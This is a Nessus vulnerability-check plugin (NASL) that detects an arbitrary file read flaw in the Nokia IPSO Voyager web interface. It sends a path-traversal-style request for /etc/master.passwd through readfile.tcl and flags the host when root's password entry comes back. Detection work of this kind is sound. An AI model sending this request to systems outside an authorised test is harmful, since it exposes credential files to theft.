#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: Jonas Eriksson [mailto:je@sekure.net]
# Date: 23/04/2003
# To: bugtraq@securityfocus.com
# Subject: Asunto: Nokia IPSO Vulnerability
#
# This vuln check only works if the user entered a username and password
# in the relevant field in the 'prefs' tab of nessus

include("compat.inc");

if (description)
{
  script_id(11549);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/11/23 20:31:34 $");

  script_osvdb_id(53995);

  script_name(english:"Nokia IPSO Voyager WebGUI readfile.tcl file Parameter Arbitrary File Access");
  script_summary(english:"checks for readfile.tcl");

  script_set_attribute(attribute:'synopsis', value:'The remote host is vulnerable to inforamtion disclosure.');
  script_set_attribute(
    attribute:'description',
    value:
"The remote host includes a CGI (/cgi-bin/readfile.tcl) which allows
anyone to read arbitrary files on the remote host with the privileges of
the HTTP daemon (typically 'nobody')."
  );
  script_set_attribute(attribute:'solution', value:"Contact the vendor for the latest version of this software.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_attribute(attribute:'see_also', value:'http://seclists.org/bugtraq/2003/Apr/301');

  script_set_attribute(attribute:"plugin_publication_date", value:"2003/04/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_dependencies("find_service1.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

w = http_send_recv3(method:"GET", item:"/cgi-bin/readfile.tcl?file=/etc/master.passwd", port:port);
if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
r = strcat(w[0], w[1], '\r\n', w[2]);

if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
{
   	security_warning(port:port);
}
